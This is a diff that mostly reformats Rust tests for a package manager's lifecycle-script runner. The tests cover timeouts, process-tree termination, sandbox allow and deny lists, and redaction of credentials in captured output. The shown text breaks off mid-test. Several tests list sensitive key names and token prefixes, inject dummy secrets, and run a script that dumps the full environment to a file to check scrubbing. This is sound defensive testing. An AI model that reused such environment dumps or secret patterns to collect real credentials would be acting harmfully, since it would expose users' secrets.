@@ -1,4 +1,4 @@
-﻿use crate::*;
+use crate::*;
 use std::collections::{HashMap, VecDeque};
 use std::path::PathBuf;
 
@@ -6,7 +6,9 @@ use std::path::PathBuf;
 fn test_is_sensitive_credential_key() {
     assert!(is_sensitive_credential_key("NPM_TOKEN"));
     assert!(is_sensitive_credential_key("_authToken"));
-    assert!(is_sensitive_credential_key("//registry.npmjs.org/:_authToken"));
+    assert!(is_sensitive_credential_key(
+        "//registry.npmjs.org/:_authToken"
+    ));
     assert!(is_sensitive_credential_key("npm_config_password"));
     assert!(is_sensitive_credential_key("secret_key"));
     assert!(is_sensitive_credential_key("AUTH_TOKEN"));
@@ -29,9 +31,16 @@ fn test_build_lifecycle_env_scrubbing() {
         "postinstall",
         "echo 1",
     );
-    ctx.extra_env.insert("npm_config__authToken".to_string(), "leak_token_123".to_string());
-    ctx.extra_env.insert("//127.0.0.1:4873/:_authToken".to_string(), "leak_token_456".to_string());
-    ctx.extra_env.insert("SAFE_VAR".to_string(), "safe_value".to_string());
+    ctx.extra_env.insert(
+        "npm_config__authToken".to_string(),
+        "leak_token_123".to_string(),
+    );
+    ctx.extra_env.insert(
+        "//127.0.0.1:4873/:_authToken".to_string(),
+        "leak_token_456".to_string(),
+    );
+    ctx.extra_env
+        .insert("SAFE_VAR".to_string(), "safe_value".to_string());
 
     let env = build_lifecycle_env(&ctx);
 
@@ -68,7 +77,10 @@ async fn test_optional_lifecycle_script_failure_isolation() {
     let mut failing_manifest = Manifest::default();
     failing_manifest.name = Some("failing-opt-pkg".to_string());
     failing_manifest.version = Some("1.0.0".to_string());
-    failing_manifest.scripts.insert("install".to_string(), "node -e \"process.exit(1)\"".to_string());
+    failing_manifest.scripts.insert(
+        "install".to_string(),
+        "node -e \"process.exit(1)\"".to_string(),
+    );
 
     let node = LifecyclePackageNode {
         package_path: "node_modules/failing-opt-pkg".to_string(),
@@ -92,7 +104,10 @@ async fn test_optional_lifecycle_script_failure_isolation() {
 
     // When optional is true, script failure is isolated and does NOT fail execution
     let res = execute_topological(&[node], &root_manifest, &opts).await;
-    assert!(res.is_ok(), "Optional script failure should not fail execute_topological");
+    assert!(
+        res.is_ok(),
+        "Optional script failure should not fail execute_topological"
+    );
 
     // Contrast with optional = false: MUST fail!
     let non_opt_pkg_dir = temp.path().join("node_modules").join("failing-req-pkg");
@@ -108,13 +123,19 @@ async fn test_optional_lifecycle_script_failure_isolation() {
     };
 
     let req_res = execute_topological(&[req_node], &root_manifest, &opts).await;
-    assert!(req_res.is_err(), "Required script failure MUST fail execute_topological");
+    assert!(
+        req_res.is_err(),
+        "Required script failure MUST fail execute_topological"
+    );
 }
 
 #[test]
 fn test_process_tree_guard_containment() {
     let guard = process_guard::ProcessTreeGuard::new();
-    assert!(guard.is_some(), "Job object / process tree guard should be created");
+    assert!(
+        guard.is_some(),
+        "Job object / process tree guard should be created"
+    );
 
     // Terminate empty guard returns true (or success)
     if let Some(g) = guard {
@@ -222,13 +243,7 @@ fn test_hierarchical_path_ancestor_resolution() {
     std::fs::create_dir_all(&intermediate_bin).unwrap();
     std::fs::create_dir_all(&leaf_bin).unwrap();
 
-    let ctx = LifecycleContext::new(
-        &root,
-        &leaf,
-        "web",
-        "build",
-        "echo 1",
-    );
+    let ctx = LifecycleContext::new(&root, &leaf, "web", "build", "echo 1");
 
     let env = build_lifecycle_env(&ctx);
     let path = env.get("PATH").unwrap();
@@ -247,11 +262,17 @@ async fn test_topological_dependency_cycle_prevention() {
     // Package A depends on B, Package B depends on A
     let mut manifest_a = Manifest::default();
     manifest_a.name = Some("pkg-a".to_string());
-    manifest_a.scripts.insert("install".to_string(), "node -e \"process.exit(0)\"".to_string());
+    manifest_a.scripts.insert(
+        "install".to_string(),
+        "node -e \"process.exit(0)\"".to_string(),
+    );
 
     let mut manifest_b = Manifest::default();
     manifest_b.name = Some("pkg-b".to_string());
-    manifest_b.scripts.insert("install".to_string(), "node -e \"process.exit(0)\"".to_string());
+    manifest_b.scripts.insert(
+        "install".to_string(),
+        "node -e \"process.exit(0)\"".to_string(),
+    );
 
     let node_a = LifecyclePackageNode {
         package_path: "node_modules/pkg-a".to_string(),
@@ -287,7 +308,10 @@ async fn test_topological_dependency_cycle_prevention() {
 
     // Cyclic dependency should NOT overflow the stack and should successfully execute
     let res = execute_topological(&[node_a, node_b], &root_manifest, &opts).await;
-    assert!(res.is_ok(), "Cycle should be gracefully handled without stack overflow");
+    assert!(
+        res.is_ok(),
+        "Cycle should be gracefully handled without stack overflow"
+    );
 }
 
 #[tokio::test]
@@ -297,15 +321,24 @@ async fn test_optional_dependency_disk_removal_on_failure() {
 
     let opt_dir = root.join("node_modules").join("optional-fail-pkg");
     std::fs::create_dir_all(&opt_dir).unwrap();
-    assert!(opt_dir.exists(), "Directory should exist prior to script execution");
+    assert!(
+        opt_dir.exists(),
+        "Directory should exist prior to script execution"
+    );
 
     let mut manifest = Manifest::default();
     manifest.name = Some("optional-fail-pkg".to_string());
     manifest.version = Some("1.0.0".to_string());
     // Failing script
-    manifest.scripts.insert("preinstall".to_string(), "node -e \"process.exit(1)\"".to_string());
+    manifest.scripts.insert(
+        "preinstall".to_string(),
+        "node -e \"process.exit(1)\"".to_string(),
+    );
     // Subsequent hook should be skipped
-    manifest.scripts.insert("install".to_string(), "node -e \"process.exit(1)\"".to_string());
+    manifest.scripts.insert(
+        "install".to_string(),
+        "node -e \"process.exit(1)\"".to_string(),
+    );
 
     let node = LifecyclePackageNode {
         package_path: "node_modules/optional-fail-pkg".to_string(),
@@ -329,7 +362,10 @@ async fn test_optional_dependency_disk_removal_on_failure() {
 
     let res = execute_topological(&[node], &root_manifest, &opts).await;
     assert!(res.is_ok(), "Optional dependency failure must be isolated");
-    assert!(!opt_dir.exists(), "Optional dependency directory must be removed on failure");
+    assert!(
+        !opt_dir.exists(),
+        "Optional dependency directory must be removed on failure"
+    );
 }
 
 #[test]
@@ -399,13 +435,7 @@ async fn test_process_tree_abort_signal_kills_entire_subtree() {
     let escaped_script_file = script_file.to_string_lossy().replace('\\', "/");
     let script_cmd = format!("node \"{escaped_script_file}\"");
 
-    let ctx = LifecycleContext::new(
-        root,
-        root,
-        "process-tree-test",
-        "preinstall",
-        &script_cmd,
-    );
+    let ctx = LifecycleContext::new(root, root, "process-tree-test", "preinstall", &script_cmd);
 
     let (abort_tx, abort_rx) = tokio::sync::watch::channel(false);
 
@@ -415,9 +445,8 @@ async fn test_process_tree_abort_signal_kills_entire_subtree() {
     };
 
     // Spawn script in background
-    let exec_task = tokio::spawn(async move {
-        execute_lifecycle_script_with_abort(&ctx, abort_fut).await
-    });
+    let exec_task =
+        tokio::spawn(async move { execute_lifecycle_script_with_abort(&ctx, abort_fut).await });
 
     // Wait until the grandchild has started and written its PID
     let mut grandchild_pid: Option<u32> = None;
@@ -445,7 +474,10 @@ async fn test_process_tree_abort_signal_kills_entire_subtree() {
 
     // Wait for task to finish with error
     let res = exec_task.await.unwrap();
-    assert!(res.is_err(), "Lifecycle execution must terminate with error on abort");
+    assert!(
+        res.is_err(),
+        "Lifecycle execution must terminate with error on abort"
+    );
 
     // Wait brief grace period for OS process cleanup
     tokio::time::sleep(std::time::Duration::from_millis(250)).await;
@@ -541,8 +573,14 @@ async fn test_workspace_execution_aborts_and_halts_remaining_packages() {
     // Verify subsequent packages (pkg-abort-2, pkg-abort-3) NEVER ran
     let content = std::fs::read_to_string(&marker_file).unwrap_or_default();
     assert!(content.contains("pkg-abort-1"));
-    assert!(!content.contains("pkg-abort-2"), "pkg-abort-2 should not have run after abort");
-    assert!(!content.contains("pkg-abort-3"), "pkg-abort-3 should not have run after abort");
+    assert!(
+        !content.contains("pkg-abort-2"),
+        "pkg-abort-2 should not have run after abort"
+    );
+    assert!(
+        !content.contains("pkg-abort-3"),
+        "pkg-abort-3 should not have run after abort"
+    );
 }
 
 #[tokio::test]
@@ -772,7 +810,10 @@ async fn test_lifecycle_topological_stress_50_plus_packages() {
         let mut manifest = Manifest::default();
         manifest.name = Some(name.clone());
         manifest.version = Some("1.0.0".to_string());
-        manifest.scripts.insert("install".to_string(), "node -e \"process.exit(0)\"".to_string());
+        manifest.scripts.insert(
+            "install".to_string(),
+            "node -e \"process.exit(0)\"".to_string(),
+        );
 
         let mut deps = Vec::new();
         if (1..10).contains(&i) {
@@ -809,7 +850,10 @@ async fn test_lifecycle_topological_stress_50_plus_packages() {
     };
 
     let res = execute_topological(&nodes, &root_manifest, &opts).await;
-    assert!(res.is_ok(), "Large 60-package topological lifecycle execution should succeed");
+    assert!(
+        res.is_ok(),
+        "Large 60-package topological lifecycle execution should succeed"
+    );
 }
 
 #[test]
@@ -818,27 +862,72 @@ fn test_glob_match_and_matches_filter() {
     let member_path = root.join("packages").join("ui-button");
 
     // Exact matches
-    assert!(matches_filter("ui-button", "ui-button", &member_path, &root));
+    assert!(matches_filter(
+        "ui-button",
+        "ui-button",
+        &member_path,
+        &root
+    ));
     assert!(!matches_filter("ui-card", "ui-button", &member_path, &root));
 
     // Scoped matches
     let scoped_path = root.join("packages").join("core");
-    assert!(matches_filter("@scope/core", "@scope/core", &scoped_path, &root));
+    assert!(matches_filter(
+        "@scope/core",
+        "@scope/core",
+        &scoped_path,
+        &root
+    ));
     assert!(matches_filter("@scope", "@scope/core", &scoped_path, &root));
-    assert!(matches_filter("@scope/*", "@scope/core", &scoped_path, &root));
-    assert!(matches_filter("@scope/c*", "@scope/core", &scoped_path, &root));
-    assert!(!matches_filter("@other", "@scope/core", &scoped_path, &root));
+    assert!(matches_filter(
+        "@scope/*",
+        "@scope/core",
+        &scoped_path,
+        &root
+    ));
+    assert!(matches_filter(
+        "@scope/c*",
+        "@scope/core",
+        &scoped_path,
+        &root
+    ));
+    assert!(!matches_filter(
+        "@other",
+        "@scope/core",
+        &scoped_path,
+        &root
+    ));
 
     // Glob matches
     assert!(matches_filter("ui-*", "ui-button", &member_path, &root));
     assert!(matches_filter("*-button", "ui-button", &member_path, &root));
-    assert!(matches_filter("ui-b?tt?n", "ui-button", &member_path, &root));
+    assert!(matches_filter(
+        "ui-b?tt?n",
+        "ui-button",
+        &member_path,
+        &root
+    ));
     assert!(!matches_filter("api-*", "ui-button", &member_path, &root));
 
     // Path matches
-    assert!(matches_filter("packages/ui-button", "ui-button", &member_path, &root));
-    assert!(matches_filter("./packages/ui-button", "ui-button", &member_path, &root));
-    assert!(matches_filter("packages/*", "ui-button", &member_path, &root));
+    assert!(matches_filter(
+        "packages/ui-button",
+        "ui-button",
+        &member_path,
+        &root
+    ));
+    assert!(matches_filter(
+        "./packages/ui-button",
+        "ui-button",
+        &member_path,
+        &root
+    ));
+    assert!(matches_filter(
+        "packages/*",
+        "ui-button",
+        &member_path,
+        &root
+    ));
     assert!(!matches_filter("apps/*", "ui-button", &member_path, &root));
 }
 
@@ -851,7 +940,11 @@ fn test_find_local_binary_and_ancestor_collection() {
     let bin_dir = root.join("node_modules").join(".bin");
     std::fs::create_dir_all(&bin_dir).unwrap();
 
-    let bin_name = if cfg!(windows) { "my-tool.cmd" } else { "my-tool" };
+    let bin_name = if cfg!(windows) {
+        "my-tool.cmd"
+    } else {
+        "my-tool"
+    };
     let bin_file = bin_dir.join(bin_name);
     std::fs::write(&bin_file, "dummy content").unwrap();
 
@@ -861,9 +954,15 @@ fn test_find_local_binary_and_ancestor_collection() {
 
     // find_local_binary traversing up from child_dir must find my-tool
     let found = find_local_binary(&child_dir, "my-tool");
-    assert!(found.is_some(), "Should find my-tool in ancestor node_modules/.bin");
+    assert!(
+        found.is_some(),
+        "Should find my-tool in ancestor node_modules/.bin"
+    );
     let found_path = found.unwrap();
-    assert_eq!(found_path.file_name().unwrap(), std::ffi::OsStr::new(bin_name));
+    assert_eq!(
+        found_path.file_name().unwrap(),
+        std::ffi::OsStr::new(bin_name)
+    );
 
     // collect_ancestor_bin_dirs should include the ancestor bin dir
     let ancestor_bins = collect_ancestor_bin_dirs(&child_dir);
@@ -879,17 +978,16 @@ async fn test_execute_binary_exit_code_fidelity() {
     let script = root.join("exit_with_code.js");
     std::fs::write(&script, "process.exit(42);").unwrap();
 
-    let status = execute_binary_async(
-        &script,
-        &[],
-        root,
-        &[],
-        &HashMap::new(),
-    ).await.expect("Binary spawn should execute");
+    let status = execute_binary_async(&script, &[], root, &[], &HashMap::new())
+        .await
+        .expect("Binary spawn should execute");
 
     assert!(!status.success());
     let code = extract_exit_status_code(&status);
-    assert_eq!(code, 42, "Exit status code must be preserved faithfully as 42");
+    assert_eq!(
+        code, 42,
+        "Exit status code must be preserved faithfully as 42"
+    );
 }
 
 #[tokio::test]
@@ -967,7 +1065,8 @@ async fn test_execute_workspace_scripts_with_filter_and_scope() {
         filter_members: Some(vec!["nonexistent-*".to_string()]),
     };
 
-    let err_res = execute_workspace_scripts_topological(root, &members, &topo_order, &bad_opts).await;
+    let err_res =
+        execute_workspace_scripts_topological(root, &members, &topo_order, &bad_opts).await;
     assert!(err_res.is_err());
     let err_msg = err_res.unwrap_err().to_string();
     assert!(err_msg.contains("No workspace packages matched the filter/scope criteria"));
@@ -1007,7 +1106,9 @@ fn test_is_sensitive_credential_key_expanded() {
     assert!(is_sensitive_credential_key("secretkey"));
 
     // Token prefixes
-    assert!(is_sensitive_credential_key("ghp_1234567890abcdef1234567890abcdef"));
+    assert!(is_sensitive_credential_key(
+        "ghp_1234567890abcdef1234567890abcdef"
+    ));
     assert!(is_sensitive_credential_key("GHP_TOKEN"));
     assert!(is_sensitive_credential_key("github_pat_11AAAAAAA_BBBBBBB"));
     assert!(is_sensitive_credential_key("GITHUB_PAT_TOKEN"));
@@ -1033,25 +1134,41 @@ fn test_process_environment_credential_scrubbing_live() {
         "node -e \"require('fs').writeFileSync('{escaped_dump}', JSON.stringify(process.env));\""
     );
 
-    let mut ctx = LifecycleContext::new(
-        root,
-        root,
-        "env-scrub-pkg",
-        "preinstall",
-        &script,
-    );
+    let mut ctx = LifecycleContext::new(root, root, "env-scrub-pkg", "preinstall", &script);
 
     // Inject all required sensitive keys into extra_env
-    ctx.extra_env.insert("AWS_ACCESS_KEY_ID".to_string(), "AKIAIOSFODNN7EXAMPLE".to_string());
-    ctx.extra_env.insert("SSH_AUTH_SOCK".to_string(), "/tmp/ssh-agent.sock".to_string());
-    ctx.extra_env.insert("JWT".to_string(), "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.dummy".to_string());
-    ctx.extra_env.insert("DEPLOY_KEY".to_string(), "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...".to_string());
-    ctx.extra_env.insert("SIGNING_KEY".to_string(), "secsign123".to_string());
-    ctx.extra_env.insert("ENCRYPTION_KEY".to_string(), "secenc456".to_string());
-    ctx.extra_env.insert("SECRET_KEY".to_string(), "secval789".to_string());
-    ctx.extra_env.insert("ghp_user_token".to_string(), "ghp_1234567890abcdef".to_string());
-    ctx.extra_env.insert("github_pat_key".to_string(), "github_pat_11ABCD_12345".to_string());
-    ctx.extra_env.insert("SAFE_BUILD_VAR".to_string(), "safe_value_xyz".to_string());
+    ctx.extra_env.insert(
+        "AWS_ACCESS_KEY_ID".to_string(),
+        "AKIAIOSFODNN7EXAMPLE".to_string(),
+    );
+    ctx.extra_env.insert(
+        "SSH_AUTH_SOCK".to_string(),
+        "/tmp/ssh-agent.sock".to_string(),
+    );
+    ctx.extra_env.insert(
+        "JWT".to_string(),
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.dummy".to_string(),
+    );
+    ctx.extra_env.insert(
+        "DEPLOY_KEY".to_string(),
+        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...".to_string(),
+    );
+    ctx.extra_env
+        .insert("SIGNING_KEY".to_string(), "secsign123".to_string());
+    ctx.extra_env
+        .insert("ENCRYPTION_KEY".to_string(), "secenc456".to_string());
+    ctx.extra_env
+        .insert("SECRET_KEY".to_string(), "secval789".to_string());
+    ctx.extra_env.insert(
+        "ghp_user_token".to_string(),
+        "ghp_1234567890abcdef".to_string(),
+    );
+    ctx.extra_env.insert(
+        "github_pat_key".to_string(),
+        "github_pat_11ABCD_12345".to_string(),
+    );
+    ctx.extra_env
+        .insert("SAFE_BUILD_VAR".to_string(), "safe_value_xyz".to_string());
 
     let status = execute_lifecycle_script(&ctx).expect("Execution should succeed");
     assert!(status.success());
@@ -1128,13 +1245,17 @@ async fn test_lifecycle_timeout_sync_and_async_exit_code_124() {
         "timeout-sync-pkg",
         "preinstall",
         "node -e \"setTimeout(() => {}, 60000)\"",
-    ).with_timeout(std::time::Duration::from_millis(200));
+    )
+    .with_timeout(std::time::Duration::from_millis(200));
 
     let start = std::time::Instant::now();
     let sync_res = execute_lifecycle_script(&ctx_sync);
     let elapsed = start.elapsed();
 
-    assert!(sync_res.is_err(), "Sync script execution must fail upon timeout");
+    assert!(
+        sync_res.is_err(),
+        "Sync script execution must fail upon timeout"
+    );
     let err = sync_res.unwrap_err();
     let code = extract_error_exit_code(&err);
     assert_eq!(code, 124, "Timeout must exit with code 124");
@@ -1147,13 +1268,17 @@ async fn test_lifecycle_timeout_sync_and_async_exit_code_124() {
         "timeout-async-pkg",
         "preinstall",
         "node -e \"setTimeout(() => {}, 60000)\"",
-    ).with_timeout(std::time::Duration::from_millis(200));
+    )
+    .with_timeout(std::time::Duration::from_millis(200));
 
     let start_async = std::time::Instant::now();
     let async_res = execute_lifecycle_script_async(&ctx_async).await;
     let elapsed_async = start_async.elapsed();
 
-    assert!(async_res.is_err(), "Async script execution must fail upon timeout");
+    assert!(
+        async_res.is_err(),
+        "Async script execution must fail upon timeout"
+    );
     let err_async = async_res.unwrap_err();
     let code_async = extract_error_exit_code(&err_async);
     assert_eq!(code_async, 124, "Async timeout must exit with code 124");
@@ -1162,7 +1287,10 @@ async fn test_lifecycle_timeout_sync_and_async_exit_code_124() {
     // 3. Topological execution with timeout
     let mut manifest = Manifest::default();
     manifest.name = Some("topo-timeout-pkg".to_string());
-    manifest.scripts.insert("install".to_string(), "node -e \"setTimeout(() => {}, 60000)\"".to_string());
+    manifest.scripts.insert(
+        "install".to_string(),
+        "node -e \"setTimeout(() => {}, 60000)\"".to_string(),
+    );
 
     let node = LifecyclePackageNode {
         package_path: "node_modules/topo-timeout-pkg".to_string(),
@@ -1175,14 +1303,19 @@ async fn test_lifecycle_timeout_sync_and_async_exit_code_124() {
     std::fs::create_dir_all(&node.disk_path).unwrap();
 
     let root_manifest = Manifest::default();
-    let opts = LifecycleOptions::new(root)
-        .with_timeout(std::time::Duration::from_millis(250));
+    let opts = LifecycleOptions::new(root).with_timeout(std::time::Duration::from_millis(250));
 
     let topo_res = execute_topological(&[node], &root_manifest, &opts).await;
-    assert!(topo_res.is_err(), "Topological execution must fail on timeout");
+    assert!(
+        topo_res.is_err(),
+        "Topological execution must fail on timeout"
+    );
     let topo_err = topo_res.unwrap_err();
     let topo_code = extract_error_exit_code(&topo_err);
-    assert_eq!(topo_code, 124, "Topological timeout must report exit code 124");
+    assert_eq!(
+        topo_code, 124,
+        "Topological timeout must report exit code 124"
+    );
 }
 
 #[tokio::test]
@@ -1213,11 +1346,10 @@ async fn test_lifecycle_timeout_terminates_grandchild_process_tree() {
         "grandchild-timeout-pkg",
         "preinstall",
         &script_cmd,
-    ).with_timeout(std::time::Duration::from_millis(1500));
+    )
+    .with_timeout(std::time::Duration::from_millis(1500));
 
-    let exec_task = tokio::spawn(async move {
-        execute_lifecycle_script_async(&ctx).await
-    });
+    let exec_task = tokio::spawn(async move { execute_lifecycle_script_async(&ctx).await });
 
     // Wait until the grandchild has started and written its PID
     let mut grandchild_pid: Option<u32> = None;
@@ -1243,7 +1375,11 @@ async fn test_lifecycle_timeout_terminates_grandchild_process_tree() {
     let res = exec_task.await.unwrap();
     assert!(res.is_err(), "Execution must fail with timeout error");
     let err = res.unwrap_err();
-    assert_eq!(extract_error_exit_code(&err), 124, "Timeout must return exit code 124");
+    assert_eq!(
+        extract_error_exit_code(&err),
+        124,
+        "Timeout must return exit code 124"
+    );
 
     // Wait brief grace period for OS process cleanup
     tokio::time::sleep(std::time::Duration::from_millis(300)).await;
@@ -1294,9 +1430,8 @@ async fn test_sigint_and_sigterm_exit_code_fidelity() {
         let _ = rx.wait_for(|&v| v).await;
     };
 
-    let exec_task = tokio::spawn(async move {
-        execute_lifecycle_script_with_abort(&ctx, abort_fut).await
-    });
+    let exec_task =
+        tokio::spawn(async move { execute_lifecycle_script_with_abort(&ctx, abort_fut).await });
 
     // Allow process to start
     tokio::time::sleep(std::time::Duration::from_millis(150)).await;
@@ -1341,7 +1476,9 @@ fn test_massive_output_pipe_drain_sync() {
     let root = temp.path();
 
     let script_file = root.join("emit_sync.js");
-    std::fs::write(&script_file, r#"
+    std::fs::write(
+        &script_file,
+        r#"
 const chunk = Buffer.alloc(64 * 1024, 'X');
 for (let i = 0; i < 165; i++) {
     process.stdout.write(chunk);
@@ -1356,40 +1493,57 @@ for (let j = 0; j < 35; j++) {
 process.stderr.write('\n//registry.npmjs.org/:_authToken=secret_auth_token_9999\n');
 process.stderr.write('password=super_secret_pass_123\n');
 process.exitCode = 0;
-"#).unwrap();
+"#,
+    )
+    .unwrap();
 
     let escaped = script_file.to_string_lossy().replace('\\', "/");
     let script = format!("node \"{escaped}\"");
 
-    let ctx = LifecycleContext::new(
-        root,
-        root,
-        "massive-output-sync-pkg",
-        "install",
-        &script,
-    ).with_capture_output(true);
+    let ctx = LifecycleContext::new(root, root, "massive-output-sync-pkg", "install", &script)
+        .with_capture_output(true);
 
     let start = std::time::Instant::now();
-    let status = execute_lifecycle_script(&ctx).expect("Sync massive output execution must succeed");
+    let status =
+        execute_lifecycle_script(&ctx).expect("Sync massive output execution must succeed");
     assert!(status.success(), "Process must exit cleanly with code 0");
-    assert!(start.elapsed() < std::time::Duration::from_secs(15), "Must complete without pipe buffer deadlock");
+    assert!(
+        start.elapsed() < std::time::Duration::from_secs(15),
+        "Must complete without pipe buffer deadlock"
+    );
 
-    let out = ctx.get_captured_output().expect("Captured output must be present");
+    let out = ctx
+        .get_captured_output()
+        .expect("Captured output must be present");
     assert_eq!(out.exit_code, 0);
 
     // Verify massive output was drained: stdout > 10MB (165 * 64KB ~ 10.8MB)
-    assert!(out.stdout.len() >= 10 * 1024 * 1024, "Stdout must be > 10 MB, was {}", out.stdout.len());
-    assert!(out.stderr.len() >= 2 * 1024 * 1024, "Stderr must be > 2 MB, was {}", out.stderr.len());
+    assert!(
+        out.stdout.len() >= 10 * 1024 * 1024,
+        "Stdout must be > 10 MB, was {}",
+        out.stdout.len()
+    );
+    assert!(
+        out.stderr.len() >= 2 * 1024 * 1024,
+        "Stderr must be > 2 MB, was {}",
+        out.stderr.len()
+    );
 
     // Verify credential scrubbing on streaming output chunks
     assert!(!out.stdout.contains("1234567890abcdef1234567890abcdef"));
     assert!(!out.stdout.contains("AKIAIOSFODNN7EXAMPLE"));
     assert!(out.stdout.contains("ghp_[REDACTED]"));
-    assert!(out.stdout.contains("AWS_ACCESS_KEY_ID=[REDACTED]") || out.stdout.contains("aws_access_key_id=[REDACTED]"));
+    assert!(
+        out.stdout.contains("AWS_ACCESS_KEY_ID=[REDACTED]")
+            || out.stdout.contains("aws_access_key_id=[REDACTED]")
+    );
 
     assert!(!out.stderr.contains("secret_auth_token_9999"));
     assert!(!out.stderr.contains("super_secret_pass_123"));
-    assert!(out.stderr.contains("_authToken=[REDACTED]") || out.stderr.contains("_authtoken=[REDACTED]"));
+    assert!(
+        out.stderr.contains("_authToken=[REDACTED]")
+            || out.stderr.contains("_authtoken=[REDACTED]")
+    );
     assert!(out.stderr.contains("password=[REDACTED]"));
 }
 
@@ -1399,7 +1553,9 @@ async fn test_massive_output_pipe_drain_async() {
     let root = temp.path();
 
     let script_file = root.join("emit_async.js");
-    std::fs::write(&script_file, r#"
+    std::fs::write(
+        &script_file,
+        r#"
 const chunk = Buffer.alloc(64 * 1024, 'A');
 for (let i = 0; i < 170; i++) {
     process.stdout.write(chunk);
@@ -1414,7 +1570,9 @@ for (let j = 0; j < 35; j++) {
 process.stderr.write('\nssh_auth_sock=/tmp/ssh-agent.sock\n');
 process.stderr.write('_authToken=super_secret_auth_token_chunk6\n');
 process.exitCode = 0;
-"#).unwrap();
+"#,
+    )
+    .unwrap();
 
     let escaped = script_file.to_string_lossy().replace('\\', "/");
     let script = format!("node \"{escaped}\"");
@@ -1425,30 +1583,54 @@ process.exitCode = 0;
         "massive-output-async-pkg",
         "postinstall",
         &script,
-    ).with_capture_output(true);
+    )
+    .with_capture_output(true);
 
     let start = std::time::Instant::now();
-    let status = execute_lifecycle_script_async(&ctx).await.expect("Async massive output execution must succeed");
+    let status = execute_lifecycle_script_async(&ctx)
+        .await
+        .expect("Async massive output execution must succeed");
     assert!(status.success(), "Process must exit cleanly with code 0");
-    assert!(start.elapsed() < std::time::Duration::from_secs(15), "Must complete without pipe buffer deadlock");
+    assert!(
+        start.elapsed() < std::time::Duration::from_secs(15),
+        "Must complete without pipe buffer deadlock"
+    );
 
-    let out = ctx.get_captured_output().expect("Captured output must be present");
+    let out = ctx
+        .get_captured_output()
+        .expect("Captured output must be present");
     assert_eq!(out.exit_code, 0);
 
     // Verify massive output was drained: stdout > 10MB
-    assert!(out.stdout.len() >= 10 * 1024 * 1024, "Stdout must be > 10 MB, was {}", out.stdout.len());
-    assert!(out.stderr.len() >= 2 * 1024 * 1024, "Stderr must be > 2 MB, was {}", out.stderr.len());
+    assert!(
+        out.stdout.len() >= 10 * 1024 * 1024,
+        "Stdout must be > 10 MB, was {}",
+        out.stdout.len()
+    );
+    assert!(
+        out.stderr.len() >= 2 * 1024 * 1024,
+        "Stderr must be > 2 MB, was {}",
+        out.stderr.len()
+    );
 
     // Verify credential scrubbing on streaming output chunks
     assert!(!out.stdout.contains("github_pat_11AAAAAAA_BBBBBBBB2222222"));
-    assert!(!out.stdout.contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.dummy"));
+    assert!(!out
+        .stdout
+        .contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.dummy"));
     assert!(out.stdout.contains("github_pat_[REDACTED]"));
     assert!(out.stdout.contains("JWT=[REDACTED]") || out.stdout.contains("jwt=[REDACTED]"));
 
     assert!(!out.stderr.contains("/tmp/ssh-agent.sock"));
     assert!(!out.stderr.contains("super_secret_auth_token_chunk6"));
-    assert!(out.stderr.contains("ssh_auth_sock=[REDACTED]") || out.stderr.contains("SSH_AUTH_SOCK=[REDACTED]"));
-    assert!(out.stderr.contains("_authToken=[REDACTED]") || out.stderr.contains("_authtoken=[REDACTED]"));
+    assert!(
+        out.stderr.contains("ssh_auth_sock=[REDACTED]")
+            || out.stderr.contains("SSH_AUTH_SOCK=[REDACTED]")
+    );
+    assert!(
+        out.stderr.contains("_authToken=[REDACTED]")
+            || out.stderr.contains("_authtoken=[REDACTED]")
+    );
 }
 
 #[test]
@@ -1456,7 +1638,9 @@ fn test_sandbox_policy_disabled_level() {
     let policy = ScriptSandboxPolicy::disabled();
     assert_eq!(policy.level, SandboxLevel::Disabled);
 
-    let err = policy.check_execution_allowed("any-pkg", "echo 1").unwrap_err();
+    let err = policy
+        .check_execution_allowed("any-pkg", "echo 1")
+        .unwrap_err();
     assert!(matches!(err, LifecycleError::ScriptsDisabled));
 }
 
@@ -1468,7 +1652,10 @@ async fn test_sandbox_policy_disabled_topological_skips() {
     let mut manifest = Manifest::default();
     manifest.name = Some("disabled-pkg".to_string());
     // If executed, this would fail or write a file, but disabled skips entirely
-    manifest.scripts.insert("postinstall".to_string(), "node -e \"process.exit(1)\"".to_string());
+    manifest.scripts.insert(
+        "postinstall".to_string(),
+        "node -e \"process.exit(1)\"".to_string(),
+    );
 
     let node = LifecyclePackageNode {
         package_path: "node_modules/disabled-pkg".to_string(),
@@ -1480,11 +1667,13 @@ async fn test_sandbox_policy_disabled_topological_skips() {
     };
 
     let root_manifest = Manifest::default();
-    let opts = LifecycleOptions::new(root)
-        .with_sandbox_policy(ScriptSandboxPolicy::disabled());
+    let opts = LifecycleOptions::new(root).with_sandbox_policy(ScriptSandboxPolicy::disabled());
 
     let res = execute_topological(&[node], &root_manifest, &opts).await;
-    assert!(res.is_ok(), "Disabled sandbox policy must skip topological script execution");
+    assert!(
+        res.is_ok(),
+        "Disabled sandbox policy must skip topological script execution"
+    );
 }
 
 #[test]
@@ -1492,27 +1681,40 @@ fn test_sandbox_policy_denylist_enforcement() {
     let policy = ScriptSandboxPolicy::default().deny_package("malicious-crypto-miner");
     assert!(policy.denylist.contains("malicious-crypto-miner"));
 
-    let err = policy.check_execution_allowed("malicious-crypto-miner", "node build.js").unwrap_err();
-    assert!(matches!(err, LifecycleError::PackageDenylisted(ref p) if p == "malicious-crypto-miner"));
+    let err = policy
+        .check_execution_allowed("malicious-crypto-miner", "node build.js")
+        .unwrap_err();
+    assert!(
+        matches!(err, LifecycleError::PackageDenylisted(ref p) if p == "malicious-crypto-miner")
+    );
 
     // Innocent package succeeds
-    assert!(policy.check_execution_allowed("innocent-pkg", "node build.js").is_ok());
+    assert!(policy
+        .check_execution_allowed("innocent-pkg", "node build.js")
+        .is_ok());
 }
 
 #[test]
 fn test_sandbox_policy_allowlist_enforcement() {
     // 1. Non-empty allowlist in Restricted mode
-    let policy = ScriptSandboxPolicy::restricted()
-        .allow_package("approved-pkg");
+    let policy = ScriptSandboxPolicy::restricted().allow_package("approved-pkg");
 
-    assert!(policy.check_execution_allowed("approved-pkg", "node build.js").is_ok());
-    let err = policy.check_execution_allowed("unapproved-pkg", "node build.js").unwrap_err();
+    assert!(policy
+        .check_execution_allowed("approved-pkg", "node build.js")
+        .is_ok());
